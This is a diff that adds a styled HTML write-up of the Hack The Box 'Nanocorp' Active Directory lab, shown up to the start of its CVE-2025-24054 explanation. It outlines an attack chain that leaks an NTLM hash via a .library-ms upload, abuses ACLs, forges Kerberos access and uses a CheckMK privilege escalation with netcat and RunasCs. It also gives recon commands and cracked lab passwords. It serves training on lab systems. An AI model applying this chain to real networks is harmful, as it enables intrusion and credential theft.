@@ -1,0 +1,1550 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Nanocorp — HTB Writeup</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@600;700;900&family=Inter:wght@300;400;500;600&display=swap');
+
+  :root {
+    --bg:      #08090e;
+    --bg2:     #0c0e17;
+    --bg3:     #10121e;
+    --surface: #141826;
+    --surface2:#181d2e;
+    --border:  #242a42;
+    --border2: #2e3858;
+    --accent:  #7c5cfc;   /* purple — AD/Kerberos vibe */
+    --accent2: #fc5c7d;   /* red — danger / exploit */
+    --accent3: #39ffb2;   /* green — success */
+    --accent4: #ffc857;   /* gold — hashes / creds */
+    --accent5: #5ce1fc;   /* cyan — info */
+    --text:    #c4cce8;
+    --text2:   #7b8ab8;
+    --text3:   #3d4a70;
+    --mono:    'Share Tech Mono', monospace;
+    --head:    'Orbitron', sans-serif;
+    --body:    'Inter', sans-serif;
+  }
+
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: var(--body);
+    font-size: 14px;
+    line-height: 1.6;
+    min-height: 100vh;
+  }
+
+  /* ── ANIMATED BG GRID ── */
+  body::before {
+    content: '';
+    position: fixed;
+    inset: 0;
+    background-image:
+      linear-gradient(rgba(124,92,252,0.03) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(124,92,252,0.03) 1px, transparent 1px);
+    background-size: 40px 40px;
+    pointer-events: none;
+    z-index: 0;
+  }
+
+  /* ── HEADER ── */
+  .site-header {
+    background: var(--bg2);
+    border-bottom: 1px solid var(--border);
+    padding: 0 24px;
+    position: sticky;
+    top: 0;
+    z-index: 100;
+    display: flex;
+    align-items: center;
+    gap: 20px;
+    height: 54px;
+    backdrop-filter: blur(8px);
+  }
+  .logo {
+    font-family: var(--head);
+    font-size: 16px;
+    font-weight: 700;
+    color: var(--accent);
+    letter-spacing: 3px;
+    white-space: nowrap;
+    text-shadow: 0 0 20px rgba(124,92,252,0.5);
+  }
+  .logo span { color: var(--accent2); }
+  .logo .sep { color: var(--text3); margin: 0 6px; }
+
+  .header-meta {
+    display: flex;
+    gap: 10px;
+    align-items: center;
+    flex-wrap: wrap;
+  }
+  .meta-badge {
+    font-family: var(--mono);
+    font-size: 10px;
+    padding: 2px 8px;
+    border-radius: 3px;
+    letter-spacing: 1px;
+  }
+  .badge-hard   { background: rgba(252,92,125,0.12); color: var(--accent2); border: 1px solid rgba(252,92,125,0.3); }
+  .badge-ad     { background: rgba(124,92,252,0.12); color: var(--accent); border: 1px solid rgba(124,92,252,0.3); }
+  .badge-win    { background: rgba(92,225,252,0.12); color: var(--accent5); border: 1px solid rgba(92,225,252,0.3); }
+  .badge-htb    { background: rgba(57,255,178,0.12); color: var(--accent3); border: 1px solid rgba(57,255,178,0.3); }
+
+  .header-right {
+    margin-left: auto;
+    font-family: var(--mono);
+    font-size: 11px;
+    color: var(--text3);
+    display: flex;
+    gap: 14px;
+    align-items: center;
+  }
+  .header-right b { color: var(--accent3); }
+
+  /* ── LAYOUT ── */
+  .layout {
+    display: flex;
+    height: calc(100vh - 54px);
+    position: relative;
+    z-index: 1;
+  }
+
+  /* ── SIDEBAR ── */
+  .sidebar {
+    width: 230px;
+    flex-shrink: 0;
+    background: var(--bg2);
+    border-right: 1px solid var(--border);
+    overflow-y: auto;
+    padding: 16px 0 40px;
+  }
+  .sidebar::-webkit-scrollbar { width: 3px; }
+  .sidebar::-webkit-scrollbar-thumb { background: var(--border2); border-radius: 2px; }
+
+  .nav-section-label {
+    font-family: var(--mono);
+    font-size: 9px;
+    color: var(--text3);
+    letter-spacing: 3px;
+    text-transform: uppercase;
+    padding: 14px 16px 6px;
+  }
+  .nav-item {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    padding: 8px 16px;
+    cursor: pointer;
+    font-size: 12px;
+    font-family: var(--body);
+    color: var(--text2);
+    border-left: 2px solid transparent;
+    transition: all 0.15s;
+    user-select: none;
+  }
+  .nav-item:hover { color: var(--text); background: rgba(124,92,252,0.04); }
+  .nav-item.active { color: var(--accent); border-left-color: var(--accent); background: rgba(124,92,252,0.08); }
+  .nav-dot { width: 6px; height: 6px; border-radius: 50%; flex-shrink: 0; }
+
+  .step-num {
+    margin-left: auto;
+    font-family: var(--mono);
+    font-size: 9px;
+    color: var(--text3);
+    background: var(--bg3);
+    padding: 1px 5px;
+    border-radius: 2px;
+  }
+
+  /* ── MAIN ── */
+  .main {
+    flex: 1;
+    overflow-y: auto;
+    padding: 32px 36px;
+    scroll-behavior: smooth;
+  }
+  .main::-webkit-scrollbar { width: 5px; }
+  .main::-webkit-scrollbar-thumb { background: var(--border2); border-radius: 3px; }
+
+  /* ── HERO / TL;DR ── */
+  .hero {
+    background: linear-gradient(135deg, rgba(124,92,252,0.08) 0%, rgba(252,92,125,0.05) 100%);
+    border: 1px solid rgba(124,92,252,0.2);
+    border-radius: 10px;
+    padding: 28px 32px;
+    margin-bottom: 40px;
+    position: relative;
+    overflow: hidden;
+  }
+  .hero::before {
+    content: 'HTB';
+    position: absolute;
+    right: 24px;
+    top: 50%;
+    transform: translateY(-50%);
+    font-family: var(--head);
+    font-size: 80px;
+    font-weight: 900;
+    color: rgba(124,92,252,0.05);
+    letter-spacing: 4px;
+    user-select: none;
+  }
+  .hero-title {
+    font-family: var(--head);
+    font-size: 26px;
+    font-weight: 900;
+    color: #fff;
+    letter-spacing: 3px;
+    margin-bottom: 4px;
+    text-shadow: 0 0 30px rgba(124,92,252,0.4);
+  }
+  .hero-sub {
+    font-family: var(--mono);
+    font-size: 11px;
+    color: var(--text3);
+    letter-spacing: 2px;
+    margin-bottom: 18px;
+  }
+  .hero-tags { display: flex; gap: 8px; flex-wrap: wrap; margin-bottom: 20px; }
+
+  .tldr-box {
+    background: rgba(0,0,0,0.3);
+    border: 1px solid rgba(124,92,252,0.25);
+    border-left: 3px solid var(--accent);
+    border-radius: 6px;
+    padding: 14px 18px;
+  }
+  .tldr-label {
+    font-family: var(--mono);
+    font-size: 10px;
+    color: var(--accent);
+    letter-spacing: 3px;
+    margin-bottom: 8px;
+  }
+  .tldr-text {
+    font-size: 13px;
+    color: var(--text2);
+    line-height: 1.7;
+  }
+  .tldr-text .hl { color: var(--accent4); font-family: var(--mono); font-size: 12px; }
+  .tldr-text .warn { color: var(--accent2); font-weight: 500; }
+  .tldr-text .ok { color: var(--accent3); font-weight: 500; }
+
+  /* ── ATTACK PATH BAR ── */
+  .attack-path {
+    display: flex;
+    align-items: center;
+    gap: 0;
+    margin-bottom: 36px;
+    overflow-x: auto;
+    padding-bottom: 4px;
+  }
+  .attack-path::-webkit-scrollbar { height: 3px; }
+  .attack-path::-webkit-scrollbar-thumb { background: var(--border2); }
+  .ap-node {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    padding: 8px 14px;
+    font-size: 11px;
+    font-family: var(--mono);
+    color: var(--text2);
+    white-space: nowrap;
+    flex-shrink: 0;
+    transition: all 0.2s;
+    cursor: default;
+  }
+  .ap-node:hover { border-color: var(--accent); color: var(--accent); }
+  .ap-node.done { border-color: rgba(57,255,178,0.3); color: var(--accent3); background: rgba(57,255,178,0.04); }
+  .ap-node.crit { border-color: rgba(252,92,125,0.35); color: var(--accent2); background: rgba(252,92,125,0.05); }
+  .ap-arrow {
+    font-family: var(--mono);
+    color: var(--text3);
+    padding: 0 4px;
+    font-size: 14px;
+    flex-shrink: 0;
+  }
+
+  /* ── SECTION ── */
+  .section { margin-bottom: 52px; scroll-margin-top: 28px; }
+  .section-header {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    margin-bottom: 20px;
+    padding-bottom: 12px;
+    border-bottom: 1px solid var(--border);
+  }
+  .section-icon {
+    width: 34px; height: 34px;
+    border-radius: 7px;
+    display: flex; align-items: center; justify-content: center;
+    font-size: 16px;
+    flex-shrink: 0;
+  }
+  .section-title {
+    font-family: var(--head);
+    font-size: 16px;
+    font-weight: 700;
+    letter-spacing: 2px;
+    color: #e0e8ff;
+  }
+  .section-sub {
+    font-size: 11px;
+    color: var(--text3);
+    font-family: var(--mono);
+    margin-top: 2px;
+    letter-spacing: 0.5px;
+  }
+  .step-tag {
+    margin-left: auto;
+    font-family: var(--mono);
+    font-size: 10px;
+    padding: 3px 10px;
+    border-radius: 4px;
+    letter-spacing: 1px;
+  }
+
+  /* ── CARDS ── */
+  .card-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(340px, 1fr));
+    gap: 14px;
+  }
+  .card {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    overflow: hidden;
+    transition: border-color 0.2s, box-shadow 0.2s;
+  }
+  .card:hover { border-color: var(--border2); box-shadow: 0 4px 24px rgba(124,92,252,0.06); }
+  .card-full { grid-column: 1 / -1; }
+  .card-head {
+    padding: 10px 14px;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    border-bottom: 1px solid var(--border);
+    background: var(--surface2);
+  }
+  .card-title {
+    font-family: var(--head);
+    font-size: 12px;
+    font-weight: 600;
+    letter-spacing: 1px;
+    color: #d0dcff;
+    flex: 1;
+  }
+  .card-body { padding: 14px; }
+
+  /* ── COMMAND BLOCKS ── */
+  .cmd-block {
+    margin-bottom: 12px;
+    border-radius: 6px;
+    overflow: hidden;
+    border: 1px solid var(--border);
+  }
+  .cmd-label {
+    background: var(--bg3);
+    padding: 5px 12px;
+    font-family: var(--mono);
+    font-size: 9px;
+    color: var(--text3);
+    letter-spacing: 2px;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+  }
+  .copy-btn {
+    cursor: pointer;
+    font-size: 9px;
+    color: var(--text3);
+    background: none;
+    border: none;
+    padding: 0 4px;
+    font-family: var(--mono);
+    transition: color 0.15s;
+  }
+  .copy-btn:hover { color: var(--accent); }
+  .cmd-code {
+    background: #06080f;
+    padding: 12px 14px;
+    font-family: var(--mono);
+    font-size: 12px;
+    line-height: 1.8;
+    color: var(--accent3);
+    white-space: pre;
+    overflow-x: auto;
+  }
+  .cmd-code::-webkit-scrollbar { height: 3px; }
+  .cmd-code::-webkit-scrollbar-thumb { background: var(--border2); }
+  .cmd-explain {
+    padding: 9px 12px;
+    background: rgba(124,92,252,0.04);
+    font-size: 12px;
+    color: var(--text2);
+    border-top: 1px solid var(--border);
+    line-height: 1.5;
+  }
+  .cmd-explain b { color: var(--accent5); font-weight: 500; }
+  .cmd-explain .flag { color: var(--accent4); font-family: var(--mono); font-size: 11px; }
+  .cmd-explain .cred { color: var(--accent2); font-family: var(--mono); font-size: 11px; }
+
+  /* Output blocks */
+  .output-block {
+    background: #04060c;
+    border: 1px solid var(--border);
+    border-left: 3px solid var(--accent3);
+    border-radius: 6px;
+    padding: 12px 14px;
+    font-family: var(--mono);
+    font-size: 11px;
+    color: #6a8a7a;
+    white-space: pre;
+    overflow-x: auto;
+    margin-bottom: 12px;
+    line-height: 1.7;
+  }
+  .output-block .hl-hash { color: var(--accent4); }
+  .output-block .hl-user { color: var(--accent5); }
+  .output-block .hl-ok   { color: var(--accent3); }
+  .output-block .hl-warn { color: var(--accent2); }
+
+  /* ── INFO BOXES ── */
+  .info-box {
+    padding: 11px 14px;
+    border-radius: 6px;
+    margin-bottom: 12px;
+    font-size: 12px;
+    line-height: 1.65;
+    border-left: 3px solid;
+  }
+  .info-blue   { background: rgba(92,225,252,0.05);  border-color: var(--accent5); color: var(--text2); }
+  .info-purple { background: rgba(124,92,252,0.06);  border-color: var(--accent);  color: var(--text2); }
+  .info-red    { background: rgba(252,92,125,0.06);  border-color: var(--accent2); color: var(--text2); }
+  .info-green  { background: rgba(57,255,178,0.05);  border-color: var(--accent3); color: var(--text2); }
+  .info-gold   { background: rgba(255,200,87,0.06);  border-color: var(--accent4); color: var(--text2); }
+  .info-box strong { display: block; font-family: var(--head); font-size: 11px; font-weight: 700; margin-bottom: 5px; letter-spacing: 1px; }
+  .info-blue strong   { color: var(--accent5); }
+  .info-purple strong { color: var(--accent); }
+  .info-red strong    { color: var(--accent2); }
+  .info-green strong  { color: var(--accent3); }
+  .info-gold strong   { color: var(--accent4); }
+
+  /* ── FLOW DIAGRAM ── */
+  .flow {
+    display: flex;
+    flex-direction: column;
+    gap: 4px;
+    padding: 14px;
+  }
+  .flow-row {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+  }
+  .flow-node {
+    background: var(--bg3);
+    border: 1px solid var(--border);
+    border-radius: 5px;
+    padding: 7px 12px;
+    font-family: var(--mono);
+    font-size: 11px;
+    color: var(--text2);
+    white-space: nowrap;
+  }
+  .flow-node.owned { border-color: rgba(57,255,178,0.4); color: var(--accent3); background: rgba(57,255,178,0.05); }
+  .flow-node.target { border-color: rgba(252,92,125,0.4); color: var(--accent2); background: rgba(252,92,125,0.05); }
+  .flow-node.pivot { border-color: rgba(124,92,252,0.4); color: var(--accent); background: rgba(124,92,252,0.06); }
+  .flow-arrow { color: var(--text3); font-family: var(--mono); font-size: 14px; }
+  .flow-label { font-size: 10px; color: var(--text3); font-family: var(--mono); }
+
+  /* ── TABLE ── */
+  .ref-table {
+    width: 100%;
+    border-collapse: collapse;
+    font-size: 12px;
+  }
+  .ref-table th {
+    background: var(--bg3);
+    padding: 7px 12px;
+    text-align: left;
+    font-family: var(--mono);
+    font-size: 9px;
+    color: var(--text3);
+    letter-spacing: 2px;
+    border-bottom: 1px solid var(--border);
+  }
+  .ref-table td {
+    padding: 8px 12px;
+    border-bottom: 1px solid rgba(36,42,66,0.7);
+    color: var(--text2);
+    vertical-align: top;
+    line-height: 1.5;
+  }
+  .ref-table tr:last-child td { border-bottom: none; }
+  .ref-table td:first-child { font-family: var(--mono); color: var(--accent5); font-size: 11px; }
+
+  /* ── WARN CALLOUT ── */
+  .callout {
+    background: rgba(255,200,87,0.06);
+    border: 1px solid rgba(255,200,87,0.2);
+    border-left: 3px solid var(--accent4);
+    border-radius: 6px;
+    padding: 12px 16px;
+    margin-bottom: 14px;
+    font-size: 12px;
+    color: var(--text2);
+    line-height: 1.6;
+  }
+  .callout-title {
+    font-family: var(--mono);
+    font-size: 10px;
+    color: var(--accent4);
+    letter-spacing: 2px;
+    margin-bottom: 6px;
+  }
+
+  /* ── SEARCH HIDDEN ── */
+  .search-hidden { display: none !important; }
+
+  /* ── SCROLLBAR ── */
+  html { scrollbar-width: thin; scrollbar-color: var(--border2) transparent; }
+
+  @media (max-width: 720px) {
+    .sidebar { display: none; }
+    .card-grid { grid-template-columns: 1fr; }
+    .main { padding: 16px; }
+    .hero::before { display: none; }
+  }
+</style>
+</head>
+<body>
+
+<header class="site-header">
+  <div class="logo">NANO<span>CORP</span><span class="sep">//</span>HTB</div>
+  <div class="header-meta">
+    <span class="meta-badge badge-hard">HARD</span>
+    <span class="meta-badge badge-ad">ACTIVE DIRECTORY</span>
+    <span class="meta-badge badge-win">WINDOWS</span>
+    <span class="meta-badge badge-htb">HACK THE BOX</span>
+  </div>
+  <div class="header-right">
+    <span><b>3</b> CVEs</span>
+    <span><b>6</b> phases</span>
+    <span>OS: Kali Linux</span>
+  </div>
+</header>
+
+<div class="layout">
+  <nav class="sidebar">
+    <div class="nav-section-label">OVERVIEW</div>
+    <div class="nav-item active" onclick="navTo('s0', this)"><span class="nav-dot" style="background:#7c5cfc"></span> TL;DR &amp; Attack Path <span class="step-num">00</span></div>
+
+    <div class="nav-section-label">PHASE 1 — RECON</div>
+    <div class="nav-item" onclick="navTo('s1', this)"><span class="nav-dot" style="background:#5ce1fc"></span> Nmap Enumeration <span class="step-num">01</span></div>
+    <div class="nav-item" onclick="navTo('s2', this)"><span class="nav-dot" style="background:#5ce1fc"></span> Web Discovery <span class="step-num">02</span></div>
+
+    <div class="nav-section-label">PHASE 2 — EXPLOIT</div>
+    <div class="nav-item" onclick="navTo('s3', this)"><span class="nav-dot" style="background:#fc5c7d"></span> CVE-2025-24054 <span class="step-num">03</span></div>
+    <div class="nav-item" onclick="navTo('s4', this)"><span class="nav-dot" style="background:#ffc857"></span> Hash Capture &amp; Crack <span class="step-num">04</span></div>
+
+    <div class="nav-section-label">PHASE 3 — FOOTHOLD</div>
+    <div class="nav-item" onclick="navTo('s5', this)"><span class="nav-dot" style="background:#7c5cfc"></span> AD Enumeration <span class="step-num">05</span></div>
+    <div class="nav-item" onclick="navTo('s6', this)"><span class="nav-dot" style="background:#7c5cfc"></span> BloodHound &amp; Trusts <span class="step-num">06</span></div>
+    <div class="nav-item" onclick="navTo('s7', this)"><span class="nav-dot" style="background:#7c5cfc"></span> BloodyAD Abuse <span class="step-num">07</span></div>
+
+    <div class="nav-section-label">PHASE 4 — SHELL</div>
+    <div class="nav-item" onclick="navTo('s8', this)"><span class="nav-dot" style="background:#fc5c7d"></span> Kerberos &amp; Evil-WinRM <span class="step-num">08</span></div>
+    <div class="nav-item" onclick="navTo('s9', this)"><span class="nav-dot" style="background:#39ffb2"></span> User Flag <span class="step-num">09</span></div>
+
+    <div class="nav-section-label">PHASE 5 — PRIVESC</div>
+    <div class="nav-item" onclick="navTo('s10', this)"><span class="nav-dot" style="background:#fc5c7d"></span> CVE-2024-0670 <span class="step-num">10</span></div>
+    <div class="nav-item" onclick="navTo('s11', this)"><span class="nav-dot" style="background:#39ffb2"></span> SYSTEM Shell <span class="step-num">11</span></div>
+
+    <div class="nav-section-label">REFERENCE</div>
+    <div class="nav-item" onclick="navTo('s12', this)"><span class="nav-dot" style="background:#ffc857"></span> Tools &amp; Commands</div>
+    <div class="nav-item" onclick="navTo('s13', this)"><span class="nav-dot" style="background:#ffc857"></span> Kerberos Troubleshoot</div>
+  </nav>
+
+  <main class="main" id="mainContent">
+
+    <!-- ══ SECTION 0: TL;DR ══ -->
+    <section class="section" id="s0">
+
+      <div class="hero">
+        <div class="hero-title">NANOCORP</div>
+        <div class="hero-sub">HACK THE BOX // HARD // ACTIVE DIRECTORY // WINDOWS SERVER 2022</div>
+        <div class="hero-tags">
+          <span class="meta-badge badge-ad">CVE-2025-24054</span>
+          <span class="meta-badge badge-win">CVE-2024-0670</span>
+          <span class="meta-badge badge-htb">NTLMv2 Capture</span>
+          <span class="meta-badge badge-hard">Kerberos TGT</span>
+          <span class="meta-badge" style="background:rgba(255,200,87,0.1);color:#ffc857;border:1px solid rgba(255,200,87,0.3)">BloodHound ACL Abuse</span>
+        </div>
+        <div class="tldr-box">
+          <div class="tldr-label">// TL;DR — READ THIS FIRST</div>
+          <div class="tldr-text">
+            This lab is <span class="warn">Kerberos hell</span>, and that's a real pain for those who haven't worked with Kerberos much — so <span class="ok">follow the Kerberos-specific hints</span>, they will help you troubleshoot most of your problems. <br><br>
+            The initial foothold is a <span class="hl">CVE-2025-24054</span> .library-ms file upload that leaks an NTLMv2 hash via Responder. Crack it, enumerate AD via BloodHound, abuse <span class="hl">add-self → IT_SUPPORT → ForceChangePassword</span> to pivot to <span class="hl">monitoring_svc</span>, then use <span class="warn">Kerberos TGT (kinit)</span> instead of password auth for Evil-WinRM on the non-standard port <span class="hl">5986 (SSL)</span>. Privesc is <span class="hl">CVE-2024-0670</span> CheckMK MSI repair abuse — drop <span class="hl">RunasCs.exe + nc.exe + exploit.ps1</span> to <span class="hl">C:\Windows\Temp</span> and trigger as <span class="hl">web_svc</span> (not monitoring_svc). <br><br>
+            <span class="warn">⚠ Critical gotcha:</span> After you force-change <span class="hl">monitoring_svc</span>'s password via BloodyAD, <span class="warn">the lab resets it to default on Evil-WinRM auth failure.</span> Do the kinit and export the TGT immediately after the password change — don't waste time.
+          </div>
+        </div>
+      </div>
+
+      <!-- Attack Path -->
+      <div class="section-header">
+        <div class="section-icon" style="background:rgba(124,92,252,0.1)">🗺️</div>
+        <div>
+          <div class="section-title">ATTACK PATH</div>
+          <div class="section-sub">Full chain from unauthenticated → NT AUTHORITY\SYSTEM</div>
+        </div>
+      </div>
+
+      <div class="attack-path">
+        <div class="ap-node done">Anon / Web</div>
+        <div class="ap-arrow">→</div>
+        <div class="ap-node crit">CVE-2025-24054<br><span style="font-size:9px;color:#555">library-ms upload</span></div>
+        <div class="ap-arrow">→</div>
+        <div class="ap-node done">NTLMv2 Hash<br><span style="font-size:9px;color:#555">Responder</span></div>
+        <div class="ap-arrow">→</div>
+        <div class="ap-node done">web_svc creds<br><span style="font-size:9px;color:#555">hashcat crack</span></div>
+        <div class="ap-arrow">→</div>
+        <div class="ap-node done">BloodHound ACL<br><span style="font-size:9px;color:#555">add-self abuse</span></div>
+        <div class="ap-arrow">→</div>
+        <div class="ap-node done">IT_SUPPORT grp<br><span style="font-size:9px;color:#555">BloodyAD</span></div>
+        <div class="ap-arrow">→</div>
+        <div class="ap-node done">monitoring_svc<br><span style="font-size:9px;color:#555">ForceChangePass</span></div>
+        <div class="ap-arrow">→</div>
+        <div class="ap-node crit">Kerberos TGT<br><span style="font-size:9px;color:#555">kinit + export</span></div>
+        <div class="ap-arrow">→</div>
+        <div class="ap-node done">WinRM Shell<br><span style="font-size:9px;color:#555">port 5986 SSL</span></div>
+        <div class="ap-arrow">→</div>
+        <div class="ap-node done">user.txt 🏁</div>
+        <div class="ap-arrow">→</div>
+        <div class="ap-node crit">CVE-2024-0670<br><span style="font-size:9px;color:#555">CheckMK MSI</span></div>
+        <div class="ap-arrow">→</div>
+        <div class="ap-node done" style="border-color:rgba(252,92,125,0.5);color:#fc5c7d">NT\AUTHORITY<br>SYSTEM 🏆</div>
+      </div>
+
+      <!-- Target info table -->
+      <div class="card-grid">
+        <div class="card">
+          <div class="card-head"><span class="card-title">🎯 TARGET DETAILS</span></div>
+          <div class="card-body">
+            <table class="ref-table">
+              <tr><td>Name</td><td style="color:var(--text)">Nanocorp</td></tr>
+              <tr><td>Domain</td><td style="color:var(--accent)">nanocorp.htb</td></tr>
+              <tr><td>DC</td><td style="color:var(--accent5)">dc01.nanocorp.htb</td></tr>
+              <tr><td>OS</td><td style="color:var(--text)">Windows Server 2022 Build 20348</td></tr>
+              <tr><td>Type</td><td style="color:var(--text)">Active Directory (1 domain)</td></tr>
+              <tr><td>Rating</td><td style="color:var(--accent2)">Hard ★★★★★</td></tr>
+              <tr><td>Platform</td><td style="color:var(--accent3)">Hack The Box</td></tr>
+              <tr><td>Attack OS</td><td style="color:var(--text)">Kali Linux</td></tr>
+            </table>
+          </div>
+        </div>
+        <div class="card">
+          <div class="card-head"><span class="card-title">🔑 CREDENTIALS FOUND</span></div>
+          <div class="card-body">
+            <table class="ref-table">
+              <tr><th>USER</th><th>PASS</th><th>METHOD</th></tr>
+              <tr>
+                <td>web_svc</td>
+                <td style="color:var(--accent4);font-family:var(--mono);font-size:11px">dksehdgh712!@#</td>
+                <td style="color:var(--text2)">NTLMv2 → hashcat</td>
+              </tr>
+              <tr>
+                <td>monitoring_svc</td>
+                <td style="color:var(--accent4);font-family:var(--mono);font-size:11px">Pa$$word123!</td>
+                <td style="color:var(--text2)">ForceChangePassword</td>
+              </tr>
+            </table>
+            <div class="info-box info-purple" style="margin-top:10px;margin-bottom:0">
+              <strong>⚠ KERBEROS NOTE</strong>
+              monitoring_svc password gets reset by the lab on failed WinRM auth. Use kinit immediately after BloodyAD password change and export TGT before attempting WinRM.
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ══ SECTION 1: NMAP ══ -->
+    <section class="section" id="s1">
+      <div class="section-header">
+        <div class="section-icon" style="background:rgba(92,225,252,0.1)">🔍</div>
+        <div>
+          <div class="section-title">NMAP ENUMERATION</div>
+          <div class="section-sub">Phase 1 — Initial recon. Classic AD port fingerprint.</div>
+        </div>
+        <span class="step-tag" style="background:rgba(92,225,252,0.1);color:var(--accent5);border:1px solid rgba(92,225,252,0.2)">STEP 01</span>
+      </div>
+
+      <div class="card-grid">
+        <div class="card card-full">
+          <div class="card-head"><span class="card-title">Initial Port Scan</span></div>
+          <div class="card-body">
+            <div class="info-box info-blue">
+              <strong>SCAN STRATEGY</strong>
+              Full aggressive scan with service detection. Save output to nmap/ directory for easy reference later. The -A flag bundles OS detection, version detection, script scanning, and traceroute.
+            </div>
+            <div class="cmd-block">
+              <div class="cmd-label">BASH — KALI<button class="copy-btn">copy</button></div>
+              <div class="cmd-code">nmap -sC -sV -A -oA nmap/scan &lt;TARGET_IP&gt;</div>
+            </div>
+            <div class="cmd-explain">
+              <span class="flag">-sC</span> default scripts &nbsp;·&nbsp;
+              <span class="flag">-sV</span> version detection &nbsp;·&nbsp;
+              <span class="flag">-A</span> aggressive (OS + traceroute) &nbsp;·&nbsp;
+              <span class="flag">-oA</span> save all formats
+            </div>
+
+            <div class="cmd-block" style="margin-top:14px">
+              <div class="cmd-label">OUTPUT — TRIMMED<button class="copy-btn">copy</button></div>
+              <div class="cmd-code" style="color:#5a7a6a">PORT     STATE SERVICE       VERSION
+53/tcp   open  domain        Simple DNS Plus
+88/tcp   open  kerberos-sec  <span style="color:var(--accent)">Microsoft Windows Kerberos</span>
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          <span style="color:var(--accent5)">Domain: nanocorp.htb</span>
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http    RPC over HTTP 1.0
+3268/tcp open  ldap          <span style="color:var(--accent5)">nanocorp.htb</span>
+<span style="color:var(--accent4)">5986/tcp open  ssl/wsmans?</span>   <span style="color:var(--text3)">← WinRM SSL (non-default!)</span>
+  ssl-cert: <span style="color:var(--accent3)">commonName=dc01.nanocorp.htb</span>
+
+Host: DC01  OS: Windows  SMB signing: <span style="color:var(--accent2)">required</span>
+clock-skew: <span style="color:var(--accent2)">6h59m56s</span> <span style="color:var(--text3)">← NOTE THIS for Kerberos!</span></div>
+            </div>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-head"><span class="card-title">🚨 Key Findings</span></div>
+          <div class="card-body">
+            <div class="info-box info-purple">
+              <strong>PORT 5986 — SSL WinRM</strong>
+              Non-standard! Default WinRM is 5985. Evil-WinRM will time out unless you explicitly pass <span style="font-family:var(--mono);color:var(--accent4)">-S -P 5986</span>.
+            </div>
+            <div class="info-box info-red">
+              <strong>CLOCK SKEW ~7H</strong>
+              Kerberos has a 5-minute tolerance window. This skew will cause TGT issues. Sync with: <span style="font-family:var(--mono);color:var(--accent4)">sudo ntpdate &lt;DC_IP&gt;</span> or configure krb5.conf properly.
+            </div>
+            <div class="info-box info-green">
+              <strong>DOMAIN CONFIRMED</strong>
+              nanocorp.htb / DC01. Add to /etc/hosts immediately: <span style="font-family:var(--mono);color:var(--accent4)">&lt;IP&gt; nanocorp.htb dc01.nanocorp.htb</span>
+            </div>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-head"><span class="card-title">📋 /etc/hosts Setup</span></div>
+          <div class="card-body">
+            <div class="cmd-block">
+              <div class="cmd-label">BASH<button class="copy-btn">copy</button></div>
+              <div class="cmd-code">echo "&lt;TARGET_IP&gt; nanocorp.htb dc01.nanocorp.htb hire.nanocorp.htb" | sudo tee -a /etc/hosts</div>
+            </div>
+            <div class="cmd-explain">Add all discovered vhosts. <b>hire.nanocorp.htb</b> is found on the web — add it proactively.</div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ══ SECTION 2: WEB ══ -->
+    <section class="section" id="s2">
+      <div class="section-header">
+        <div class="section-icon" style="background:rgba(92,225,252,0.1)">🌐</div>
+        <div>
+          <div class="section-title">WEB DISCOVERY</div>
+          <div class="section-sub">Port 80 running — job application portal reveals file upload.</div>
+        </div>
+        <span class="step-tag" style="background:rgba(92,225,252,0.1);color:var(--accent5);border:1px solid rgba(92,225,252,0.2)">STEP 02</span>
+      </div>
+
+      <div class="card-grid">
+        <div class="card card-full">
+          <div class="card-head"><span class="card-title">Web Recon Path</span></div>
+          <div class="card-body">
+            <div class="flow">
+              <div class="flow-row">
+                <div class="flow-node">http://nanocorp.htb</div>
+                <div class="flow-arrow">→</div>
+                <div class="flow-label">Job application portal</div>
+                <div class="flow-arrow">→</div>
+                <div class="flow-node pivot">http://hire.nanocorp.htb</div>
+                <div class="flow-arrow">→</div>
+                <div class="flow-node target">File Upload Functionality 🎯</div>
+              </div>
+            </div>
+            <div class="info-box info-gold" style="margin-top:8px">
+              <strong>NOTE</strong>
+              Port 80 may not show in nmap if previously scanned or filtered. Visit <span style="font-family:var(--mono)">http://nanocorp.htb</span> directly. The hire subdomain is discovered through the site's navigation/links. The file upload on hire.nanocorp.htb is the attack surface for CVE-2025-24054.
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ══ SECTION 3: CVE-2025-24054 ══ -->
+    <section class="section" id="s3">
+      <div class="section-header">
+        <div class="section-icon" style="background:rgba(252,92,125,0.1)">💥</div>
+        <div>
+          <div class="section-title">CVE-2025-24054</div>
+          <div class="section-sub">NTLM Hash Disclosure via .library-ms File — Windows 10/11</div>
+        </div>
+        <span class="step-tag" style="background:rgba(252,92,125,0.1);color:var(--accent2);border:1px solid rgba(252,92,125,0.2)">STEP 03</span>
+      </div>
+
+      <div class="card-grid">
+        <div class="card card-full">
+          <div class="card-head"><span class="card-title">How The Exploit Works</span></div>
+          <div class="card-body">
+            <div class="info-box info-red">
+              <strong>VULNERABILITY SUMMARY</strong>
+              Windows renders .library-ms XML files (Windows Library format) and follows &lt;url&gt; tags to resolve network share icons/logos — without validating whether the path is reachable. When it tries to access a UNC path (e.g. \\10.10.17.39\shared), it authenticates via SMB using the current user's NTLMv2 hash. A fake SMB server (Responder) catches the authentication attempt and captures the hash.
+            </div>
+
